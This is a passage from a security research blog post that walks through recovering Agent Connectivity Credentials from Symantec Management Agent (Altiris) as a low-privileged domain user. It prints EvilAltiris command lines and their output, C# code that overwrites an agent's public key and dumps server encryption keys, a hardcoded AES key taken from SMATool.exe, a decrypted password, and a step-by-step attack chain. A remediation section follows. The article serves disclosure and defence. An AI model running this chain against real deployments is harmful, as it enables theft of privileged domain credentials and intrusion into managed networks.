+██▄ ▀▄▀ █ █▄▄ █▀█ █▄▄  █  █ █▀▄ █ ▄█
+
+Author: Matt Johnson - MDSec ActiveBreach - v0.0.1
+
+[+] Generating new asymmetric key pair for Agent encryption...
+[+] Public Key Modulus (Base64): qDHx4/T+bEWU/oxbowWxaCtu3MZF9FvAJ1/g1iD2Nu0v6aNxO77W7iRP3/mrcR5QQQ2azAXj0xhTbSEtk/4PlfN09EMurBnCXfJ9DHhKwrMQs9qatOOI0989/QQbMA6at7iVgpf4BC99GNjTizJJFQnIGLjSk4QfrMl2DiWsCzTAE7oFAwsERjFMxDB3FMhysKP4n2iRPdLP2LLkfV7yU9W9vuopeArDYxP1UpSUZjyzXPePhhRF3+Oz8q8v2hv5Uq23wuDdVY8PZ8XwY5G5rniBFA2GFV+uYE6juidceiLUeQDdSY88EiYjNZrzxzjtG5fqpnZVard1Wgk23EyznQ==
+[+] Public Key Exponent (Base64): AQAB
+[+] Generating SMA CSP blob (policyKey)...
+AAAAAQABqDHx4/T+bEWU/oxbowWxaCtu3MZF9FvAJ1/g1iD2Nu0v6aNxO77W7iRP3/mrcR5QQQ2azAXj0xhTbSEtk/4PlfN09EMurBnCXfJ9DHhKwrMQs9qatOOI0989/QQbMA6at7iVgpf4BC99GNjTizJJFQnIGLjSk4QfrMl2DiWsCzTAE7oFAwsERjFMxDB3FMhysKP4n2iRPdLP2LLkfV7yU9W9vuopeArDYxP1UpSUZjyzXPePhhRF3+Oz8q8v2hv5Uq23wuDdVY8PZ8XwY5G5rniBFA2GFV+uYE6juidceiLUeQDdSY88EiYjNZrzxzjtG5fqpnZVard1Wgk23EyznQ==
+[+] Private Key (XML): &lt;RSAKeyValue&gt;&lt;TRIMMED FOR BREVITY&gt;&lt;/RSAKeyValue&gt;
+</code></pre><p>An interesting observation about the <code>CreateResource.aspx</code> endpoint is that there is nothing stopping us from simply updating the <code>policyKey</code> value for an existing agent. The only requirement is that we know the <code>machineGUID</code> of the device we want to overwrite. When we next request our policy data, the data will now be encrypted with our controlled key.</p>
+<p><img src="/altiris/image%208.png" alt="image.png"></p>
+<p>As the <code>machineGuid</code> can be read by any low privileged user, we can opt to generate a new asymmetric key pair and then overwrite the <code>policyKey</code>value for the machine. To automate this, we added a function to <code>EvilAltiris</code> to overwrite an existing agent public key for a given <code>machineGuid</code> with our own.</p>
+<pre><code>EvilAltiris.exe SetPublicKey /key:AAAAAQABqDHx4/T+bEWU/oxbowWxaCtu3MZF9FvAJ1/g1iD2Nu0v6aNxO77W7iRP3/mrcR5QQQ2azAXj0xhTbSEtk/4PlfN09EMurBnCXfJ9DHhKwrMQs9qatOOI0989/QQbMA6at7iVgpf4BC99GNjTizJJFQnIGLjSk4QfrMl2DiWsCzTAE7oFAwsERjFMxDB3FMhysKP4n2iRPdLP2LLkfV7yU9W9vuopeArDYxP1UpSUZjyzXPePhhRF3+Oz8q8v2hv5Uq23wuDdVY8PZ8XwY5G5rniBFA2GFV+uYE6juidceiLUeQDdSY88EiYjNZrzxzjtG5fqpnZVard1Wgk23EyznQ== /url:http://dc.initech.local /machine:{CBE20FEC-1031-48D8-B277-50D593329CE4}
+
+█▀▀ █ █ █ █   ▄▀█ █   ▀█▀ █ █▀█ █ █▀
+██▄ ▀▄▀ █ █▄▄ █▀█ █▄▄  █  █ █▀▄ █ ▄█
+
+Author: Matt Johnson - MDSec ActiveBreach - v0.0.1
+
+[+] Response received for request:
+[+] Response Content:
+&lt;Resource guid=&quot;{CBE20FEC-1031-48D8-B277-50D593329CE4}&quot; typeGuid=&quot;{2c3cb3bb-fee9-48df-804f-90856198b600}&quot; name=&quot;&quot; ref=&quot;cbe20fec-1031-48d8-b277-50d593329ce4&quot; existing=&quot;True&quot; nsKey=&quot;AAAAAQABvXj197K0K60misOMVqpnwDWFw/UHrRvBgZ6Lepdfk9eHkyfmCndWuH92Sz5BpfdvpjoOYNIPRAd4evJqrbgFrRg58ddKyS70L2aYofGU39Op5s+PtV4RP9eA5GIi5Felaxt0fjFHuWvB54PmzeKrqFtRDz1bfNUvZwn4tvU5p5LKUs/TlQ+6RcuThnZhNwuHbIOa589ezjnKwaAd2XPNIG2OUNcGaLIK4eJK1B0sHvtJRun+mLAtTd82kePYstgyh1XGqSzuBY5mIKAXAACLeWg7tGDWGQedHLy3T4vmPCniq4Eq/ylE9g4CwkYtp9zDY0Pr/vT92ULFN/H4pQ9btQ==&quot;&gt;
+  &lt;symmetricKeySets exportedAt=&quot;638670151141935445&quot; machine=&quot;DC&quot;&gt;
+    &lt;symmetricKeySet name=&quot;NS.AgentSettings&quot;&gt;
+      &lt;symmetricKey keyType=&quot;kDefault, kExposableToAgent&quot; algorithm=&quot;AesCryptoServiceProvider&quot; cipherMode=&quot;CBC&quot; paddingMode=&quot;PKCS7&quot; key=&quot;gK8Uj/pXZzw+tRJV5ihzzw468bZkXzdEwNFgMJs2fW4=&quot; IV=&quot;unhnVwwntk7jrhLh79loQw==&quot; keyHash=&quot;OUaJHNCD90o23wBfTdXCnR7/j5c9bGDKndFUJxlhm2s=&quot; /&gt;
+    &lt;/symmetricKeySet&gt;
+  &lt;/symmetricKeySets&gt;
+&lt;/Resource&gt;
+</code></pre><p>A nice bonus here is that the Notification Server also includes the agent <code>TypeGUID</code> in the response which we will need to request the agent policy data. This is useful because as a low privileged user we are unable to read the <code>TypeGUID</code> value directly due to it being stored encrypted within the <code>LDB</code>. <strong>Note</strong>: The symmetric key included in the response data is not useful to us as it is not used for protecting the policy data.</p>
+<p>The issue with this approach is that once we overwrite the <code>policyKey</code>, the agent will no longer be able to decrypt it’s own policy requests (as it has no knowledge of the newly generated key). This is less than ideal as it leaves the agent in an unstable state unable to receive future policy updates. Indeed, after overwriting the agent public key we see that an error status is now shown inside the console.</p>
+<p><img src="/altiris/Screenshot_from_2024-11-18_14-36-26.png" alt="Screenshot from 2024-11-18 14-36-26.png"></p>
+<p>We spent some time on this trying to find a way to somehow restore the agent after overwriting the existing public key. Late one night, while digging into the Symantec Management Agent COM interface with OleView, we struck gold.</p>
+<p><img src="/altiris/image%209.png" alt="image.png"></p>
+<p>The Symantec Management Agent service exposes a local COM server <code>AeXNSAgent</code> exporting a number of methods for managing the agent. One of the methods <code>ClearMachineGuid</code> provided the exact functionality we were after. Calling this function causes the agent to make a request to the <code>CreateResource.aspx</code> endpoint with the existing agent metadata (and crucially agent public key value) currently assigned to the machine.</p>
+<p><strong>Note</strong>: The method name is somewhat of a misnomer, as the <code>machineGuid</code> value won’t really be “cleared”. This is because the <code>machineGuid</code> value is calculated based on the information contained in the request (the hardware of the machine, computer name, MAC address etc). As this information is unlikely to change, the <code>machineGuid</code> value returned by the Notification Server will very likely remain unchanged.</p>
+<p>Calling this method via C# is straightforward using the below code.</p>
+<pre><code>            dynamic comObject = Activator.CreateInstance(Type.GetTypeFromProgID(&quot;Altiris.AeXClient.1&quot;));
+            comObject.ClearMachineGuid();         
+</code></pre><p>After making this call, we can see the request to <code>CreateResource.aspx</code> is made by the agent.</p>
+<p><img src="/altiris/image%2010.png" alt="image.png"></p>
+<p>This will restore the <code>policyKey</code> value back to the original public key value stored within the <code>LDB</code> on the agent prior to our exploit. Opening up the console again, we see that the agent is now able to receive data from the Notification Server successfully.</p>
+<p><img src="/altiris/Screenshot_from_2024-11-18_14-36-38.png" alt="Screenshot from 2024-11-18 14-36-38.png"></p>
+<h3 id="decrypting-policy-data">Decrypting Policy Data</h3>
+<p>With knowledge of the <code>MachineGuid</code>, <code>TypeGUID</code> and our attacker controlled public key assigned to the machine, we can now make a request for the agent policy data from the <code>GetClientPolicies.aspx</code> endpoint. As the returned data will be encrypted with our generated public key, we simply need to reverse the encryption process to recover the policy data.</p>
+<p>Reviewing the server-side code, we find the <code>ProcessNodeData</code> function within the <code>Altiris87.NS.dll:Altiris.NS.AgentManagement.AgentDataProtection.cs</code> Class is responsible for generating our policy XML data.</p>
+<pre><code>    private static void ProcessNodeData(
+      XmlNode node,
+      AsymmetricKeyEncryption encryptor,
+      bool cleanSecureAttributes,
+      bool bCleanSecuredData)
+    {
+&lt;TRIMMED FOR BREVITY&gt;
+              byte[] bytes = Encoding.UTF8.GetBytes(node.Attributes[name].Value ?? string.Empty);
+              node.Attributes[name].Value = Convert.ToBase64String(encryptor.Encrypt(bytes));
+            }
+            else if (bCleanSecuredData)
+              node.Attributes[name].Value = string.Empty;
+          }
+        }
+</code></pre><p>This in turn calls the <code>Encrypt</code> function of the <code>Altiris87.NS.dll:Altiris.NS.Security.Cryptography.AsymmetricKeyEncryption.cs</code> Class in order to create the <code>enc_header</code> data.</p>
+<pre><code>    internal byte[] Encrypt(byte[] data, SymmetricKeyInfo key)
+    {
+        try
+        {
+          SymmetricKeyEncryption.enc_header header = SymmetricKeyEncryption.GenerateHeader(this.m_symmetricKey, (short) this.EncryptionFlag);
+          using (MemoryStream memoryStream = new MemoryStream())
+          {
+            header.ToStream(memoryStream);
+            byte[] buffer = this.m_rsaEncryptor.Encrypt(memoryStream.ToArray(), false);
+            memoryStream.Seek(0L, SeekOrigin.Begin);
+            memoryStream.Write(AsymmetricKeyEncryption.EncryptionVersionBytes, 0, AsymmetricKeyEncryption.EncryptionVersionBytes.Length);
+            memoryStream.Write(buffer, 0, buffer.Length);
+            SymmetricKeyEncryption.Encrypt(data, header, this.m_symmetricKey, key, memoryStream);
+            return memoryStream.ToArray();
+          }
+        }
+</code></pre><p>The policy XML data is not entirely encrypted using the machine’s public key, instead a unique symmetric key is generated per request and used to encrypt the policy XML data. This symmetric key and IV are then added to the <code>enc_header</code> blob which is encrypted with the machine’s public key. This encrypted header is prepended to the encrypted policy XML data and returned to the agent.</p>
+<p>To perform the decryption, we need to parse out the <code>enc_header</code> from the returned policy data, decrypt the header with our machine’s private key, extract the symmetric key and finally decrypt the policy data.</p>
+<pre><code>EvilAltiris.exe decryptpolicy /data:policy.dat /key:&quot;&lt;RSAKeyValue&gt;&lt;TRIMMED FOR BREVITY&gt;&lt;/RSAKeyValue&gt;&quot;
+
+█▀▀ █ █ █ █   ▄▀█ █   ▀█▀ █ █▀█ █ █▀
+██▄ ▀▄▀ █ █▄▄ █▀█ █▄▄  █  █ █▀▄ █ ▄█
+
+Author: Matt Johnson - MDSec ActiveBreach - v0.0.1
+
+[+] Got symmetric key from header: (m_key) a4ZNJ2KHVIhePZ/h1eo67Ib9xaGwlLq64TxjxGguqwM=
+[+] Got IV from header: (m_IV) a82AD/wISjMFCD0jL0HbWg==
+[+] Decrypted Policy Data:
+&lt;response nsVersion=&quot;8.7.2337.0&quot;&gt;&lt;resources&gt;&lt;resource guid=&quot;{114b7178-2e4e-4071-81df-919b3f10e0c2}&quot;&gt;&lt;resourcePolicy guid=&quot;{142f2372-e64d-43c0-a207-17db2c0552c4}&quot; /&gt;&lt;resourcePolicy guid=&quot;{cd52eb66-061c-423e-bf7e-082927138dfe}&quot; /&gt;&lt;resourcePolicy guid=&quot;{ecc0813a-19a3-464f-8f1e-fb6aef254955}&quot; /&gt;&lt;resourcePolicy guid=&quot;{fe798592-5242-432d-8cc8-4c5b14e0fb70}&quot; /&gt;&lt;/resource&gt;&lt;/resources&gt;&lt;policyHashes&gt;&lt;policyHash policy=&quot;{142f2372-e64d-43c0-a207-17db2c0552c4}&quot; hash=&quot;BFE5B786CE90FCD5DD01E2060A89568D&quot; /&gt;&lt;policyHash policy=&quot;{cd52eb66-061c-423e-bf7e-082927138dfe}&quot; hash=&quot;F7EA96101DD24AD34CB319FDD92B2445&quot; /&gt;&lt;policyHash policy=&quot;{ecc0813a-19a3-464f-8f1e-fb6aef254955}&quot; hash=&quot;23C2C85434EE83842769C139A9E8AC26&quot; /&gt;&lt;policyHash policy=&quot;{fe798592-5242-432d-8cc8-4c5b14e0fb70}&quot; hash=&quot;6FEFB6960D19BBB86E3299209B07DFCA&quot; /&gt;&lt;/policyHashes&gt;&lt;policies&gt;&lt;Policy guid=&quot;{142F2372-E64D-43C0-A207-17DB2C0552C4}&quot; name=&quot;All Desktop computers (excluding 'Site Servers')&quot; version=&quot;8.7.2337.0&quot;&gt;&lt;ClientPolicy agentClsid=&quot;Altiris.AeXNSClientConfigUpdate&quot;&gt;
+&lt;TRIMMED FOR BREVITY&gt;
+&lt;PkgAccessCredentials policySecuredNode=&quot;{7A631FB0-26A5-478e-9AE7-A848EE1140C0}&quot; SecuredAttributeD0885E2A8AB9_BlockUnsecureProcessing=&quot;secured&quot; defaultACC_SecureAttribute=&quot;highsecured&quot; defaultACC=&quot;True&quot; userName_SecureAttribute=&quot;highsecured&quot; userName=&quot;AwCWjVk9oCVKSGAwMcGdrHeeGgb3zP+X1URujyeX9sSNCg865meVAxDjjwu7yrMiwtSqRyFSu223tHkudAu6S8jKB/wEgk30d29OXW/J64/8sVtNWclR98HnX20aeKYTvKskYh+KE/oW/QuTrhZgICiw17GMFRwLRbOs3pN8Yd85zA1gINudPo2EJWMjvqGNcnFyQa58k3sGm0pC1SLQ73zd1ynPTExur2lpRbNmgv8tmQ==&quot; userPassword_SecureAttribute=&quot;highsecured&quot; userPassword=&quot;AwCWjVk9oCVKSGAwMcGdrHee24NhmeSpLOyxpDXmlYRpVyKJaUnSYOjplCbL/bAW5g7XMsEudlbPWAiBTlH5lf+eOAbBTxH/1529ZKzBjMILfXJBrnyTewabSkLVItDvfN3XKc9MTG6vaWlFs2aC/y2Z&quot; /&gt;
+&lt;TRIMMED FOR BREVITY&gt;
+</code></pre><p>Once decrypted we are able to view the raw policy data XML, including the encrypted ACC.</p>
+<h3 id="decrypting-acc-credential-blobs-without-smatool">Decrypting ACC Credential Blobs without SMATool</h3>
+<p>We now have one final layer of encryption to get through in order to recover the ACC. Based on our earlier testing, we know that <code>SMATool.exe</code> must contain a static key in order to be able to decrypt ACCs across environments. As <code>SMATool.exe</code> is a native binary, we are limited to using the debugger to uncover it&rsquo;s internals, however, the back-end Notification Server binaries help give insights into the encryption process. Specifically <code>Altiris87.NS.dll:Altiris.NS.AgentManagement.ConnectionProfiles.ConnectionProfile.cs</code></p>
+<p>This class imports an XML connection profile containing an encrypted copy of the <code>ACCUser</code> and <code>ACCPassword</code> values. We can see that unless otherwise configured these are set to the <code>AppIdentity.GetAppIdentity()</code> and <code>AppIdentity.Password</code> respectively.</p>
+<pre><code>			using (SymmetricKeyInfo keyWithImpersonation = SymmetricKeyManager.GetKeyWithImpersonation(&quot;NS.AgentSettings&quot;))
+			{
+				this.ACCUser = BasicCrypto.DecryptStringFromBase64String(XmlHelper.GetAttr(xmlNode, &quot;userName&quot;, string.Empty), keyWithImpersonation);
+				this.ACCPassword = BasicCrypto.DecryptStringFromBase64String(XmlHelper.GetAttr(xmlNode, &quot;userPassword&quot;, string.Empty), keyWithImpersonation);
+				string text = Core.PkgAccessUserName;
+				string text2 = Core.PkgAccessPassword;
+				if (text.Length == 0)
+				{
+					text2 = AppIdentity.Password;
+					text = AppIdentity.GetAppIdentity();
+				}
+				if (this.ACCUser != text || this.ACCPassword != text2)
+				{
+					this.UseDefaultACC = false;
+				}
+			}
+</code></pre><p>To decrypt these values, the <code>NS.AgentSettings</code> symmetric key is returned from the Notification Server’s KMS. We can extract these keys using the same technique as before by referencing the <code>Altiris.NS.dll</code> and calling the <code>SymmetricKeyManager.GetKey</code> function.</p>
+<pre><code>        static void Main(string[] args)
+        {
+            XmlWriter writer = null;
+            XmlWriterSettings settings = new XmlWriterSettings();
+            settings.ConformanceLevel = ConformanceLevel.Auto;
+            writer = XmlWriter.Create(&quot;keys.xml&quot;, settings);
+
+            using (SymmetricKeyInfo keyWithImpersonation = SymmetricKeyManager.GetKey(&quot;NS.AgentSettings&quot;))
+            {
+                keyWithImpersonation.ToXml(writer);
+                writer.WriteStartElement(&quot;entry&quot;);
+                writer.WriteElementString(&quot;item&quot;, &quot;a&quot;);
+                writer.WriteEndElement();
+                writer.Flush();
+            }
+        }
+</code></pre><p>Running this on the Notification Server results in the below output. Note that the KMS can store multiple keys in a single file, for our purposes we are interested in the <code>kHardcoded</code> key value.</p>
+<pre><code>&lt;symmetricKey keyType=&quot;kDefault, kExposableToAgent&quot; algorithm=&quot;AesCryptoServiceProvider&quot; cipherMode=&quot;CBC&quot; paddingMode=&quot;PKCS7&quot; key=&quot;gK8Uj/pXZzw+tRJV5ihzzw468bZkXzdEwNFgMJs2fW4=&quot; IV=&quot;unhnVwwntk7jrhLh79loQw==&quot; keyHash=&quot;OUaJHNCD90o23wBfTdXCnR7/j5c9bGDKndFUJxlhm2s=&quot; /&gt;&lt;symmetricKey keyType=&quot;kLegacy&quot; algorithm=&quot;TripleDES&quot; cipherMode=&quot;CBC&quot; paddingMode=&quot;PKCS7&quot; key=&quot;TX4rhhVm2LcsHEoYaFINHNAOZtPYR44U&quot; IV=&quot;JsRUMupG2/E=&quot; keyHash=&quot;tSD9GraBXU/nWkvAfUcuBtOlu+oEzDWbhABwdkhQlok=&quot; /&gt;&lt;symmetricKey keyType=&quot;kHardcoded&quot; algorithm=&quot;AesCryptoServiceProvider&quot; cipherMode=&quot;CBC&quot; paddingMode=&quot;PKCS7&quot; key=&quot;3K1VTlfiGF1JvmA89+jB6TmvmY12duipOHZ4nmPxQ3o=&quot; IV=&quot;lo1ZPaAlSkhgMDHBnax3ng==&quot; keyHash=&quot;ckGufJN7BptKQtUi0O983dcpz0xMbq9paUWzZoL/LZk=&quot; /&gt;&lt;entry&gt;&lt;item&gt;a&lt;/item&gt;&lt;/entry&gt;
+</code></pre><p>To confirm how these keys are used by the native <code>SMATool.exe</code> binary during decryption, we load the binary into x32dbg, set the command line as <code>SMATool.exe /TPWD:MDSEC /DATA DUMP PASSWORD &lt;ENCRYPTED_DATA&gt;</code> and toggle a break point on the <code>CryptDecrypt</code> function.</p>
+<p><img src="/altiris/d2f3a284-2cfc-42b5-893a-22a33cd76ba5.png" alt="breakpoint.png"></p>
+<p>Before the call to <code>CryptDecrypt</code> we observe the below arguments pushed to the stack.</p>
+<pre><code>0078F7B0  70937CAD  return to aexagentext.70937CAD from ???
+0078F7B4  00CEA8F8  &lt;--- handle to HCRYPTKEY
+0078F7B8  00000000
+0078F7BC  00000001
+0078F7C0  00000000
+0078F7C4  02AB1D40  &lt;--- pointer to encrypted buffer
+0078F7C8  0078F808  &lt;--- pointer to length of encrypted buffer (DWORD)
+</code></pre><p>Looking in the dump we observe that our encrypted data starts 18 bytes into the blob while the last 64 bytes are ignored.</p>
+<pre><code>02AB1D40  B1854820        H.±
+02AB1D44  BDFAEDF8       øíú½
+02AB1D48  0D7893D6       Ö.x.
+02AB1D4C  1107E3A5       ¥ã..
+02AB1D50  98CDA8F6       ö¨Í.
+02AB1D54  E4579ABB       ».Wä
+02AB1D58  4F8C955F       _..O
+02AB1D5C  7172B331       1³rq
+02AB1D60  7FB2DE4A       JÞ².
+02AB1D64  7B62CD73       sÍb{
+02AB1D68  69F4AAF9       ùªôi
+02AB1D6C  D4598F5B       [.YÔ
+</code></pre><p>Our AES key structure can be found inside the memory region referenced by the <code>HCRYPTKEY</code> argument.</p>
+<p><img src="/altiris/x86_key_extract_crop.png" alt="x86_key_extract_crop.png"></p>
+<p>Which matches the key value in our XML output of <code>keyType=&quot;kHardcoded&quot;</code>.</p>
+<pre><code>DC AD 55 4E 57 E2 18 5D 49 BE 60 3C F7 E8 C1 E9 39 AF 99 8D 76 76 E8 A9 38 76 78 9E 63 F1 43 7A
+</code></pre><p>From here, we can make a stand-alone class to handle decryption of ACC credential blobs and add this functionality into EvilAltiris.</p>
+<pre><code>Z:\G&gt;Z:\evilaltiris-main\EvilAltiris\bin\Release\EvilAltiris.exe DecryptACC /data:AwCWjVk9oCVKSGAwMcGdrHee24NhmeSpLOyxpDXmlYRpVyKJaUnSYOjplCbL/bAW5g7XMsEudlbPWAiBTlH5lf+eOAbBTxH/1529ZKzBjMILfXJBrnyTewabSkLVItDvfN3XKc9MTG6vaWlFs2aC/y2Z
+
+█▀▀ █ █ █ █   ▄▀█ █   ▀█▀ █ █▀█ █ █▀
+██▄ ▀▄▀ █ █▄▄ █▀█ █▄▄  █  █ █▀▄ █ ▄█
+
+Author: Matt Johnson - MDSec ActiveBreach - v0.0.1
+
+[+] Decrypted ACC value: SuperSecure!
+</code></pre><h2 id="putting-it-all-together">Putting it all together</h2>
+<p>We now have all the components required to recover the ACC using a low privileged domain user by performing the following steps:</p>
+<ul>
+<li>Read the MachineGuid from the registry</li>
+<li>Generate a new public / private key pair</li>
+<li>Overwrite the existing public key (policyKey) for our machine and return the TypeGuid</li>
+<li>Request the encrypted policy data from the server</li>
+<li>Decrypt the policy data and included ACC</li>
+<li>Restore the machine public key to its original value</li>
+</ul>
+<p>The video below demonstrates performing these actions via <code>EvilAltiris</code></p>
+<video width="640" height="360" class="video-shortcode" preload="auto" controls>
+    <source src="/altiris/low_priv_2.mp4" type="video/mp4">
+    There should have been a video here but your browser does not seem
+    to support it.
+</video>
+
+<h2 id="remediation">Remediation</h2>
+<p>This issue can be remediated by following the principle of least privilege and changing the default value for the ACC from the Application Identity account to a specific local account on the Notification Server. Symantec outline the following best practices for the ACC in their <a href="https://knowledge.broadcom.com/external/article/194234/how-to-setup-agent-connectivity-credenti.html">documentation</a>, specifically:</p>
+<ul>
+<li>Use a Local Account for the ACC, not a Domain Account.</li>
+<li>The new local account must be granted at least READ permissions to the locations where the package files are located such as the Software Library, NSCAP share, and Patch Download location.  If these are all on the same Drive, then READ access can be added at the Drive level for simplicity.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li>
+<p><a href="https://forums.codeguru.com/showthread.php?79163-Structure-of-HCRYPTKEY-Data">https://forums.codeguru.com/showthread.php?79163-Structure-of-HCRYPTKEY-Data</a><a href="https://www.elastic.co/security-labs/ransomware-in-the-honeypot-how-we-capture-keys">https://www.elastic.co/security-labs/ransomware-in-the-honeypot-how-we-capture-keys</a></p>
+</li>
+<li>
+<p><a href="https://blog.xpnsec.com/unobfuscating-network-access-accounts/">https://blog.xpnsec.com/unobfuscating-network-access-accounts/</a></p>
+</li>
+</ul>
+<p><strong>This article was also posted on <a href="https://www.mdsec.co.uk/2024/12/extracting-account-connectivity-credentials-accs-from-symantec-management-agent-aka-altiris/">mdsec.co.uk</a></strong></p>
+</div>
+  
+</article></main>
+<footer class="footer">
+  <span>&copy; 2024 <a href="https://breakfix.co/">breakfix.co</a></span>
+  <span>&middot;</span>
+  <span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️</span>
+  <span>&middot;</span>
+  <span>Theme️ <a href="https://github.com/nanxiaobei/hugo-paper" rel="noopener" target="_blank">Paper</a></span>
+</footer>
+<script src="https://breakfix.co/highlight.min.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
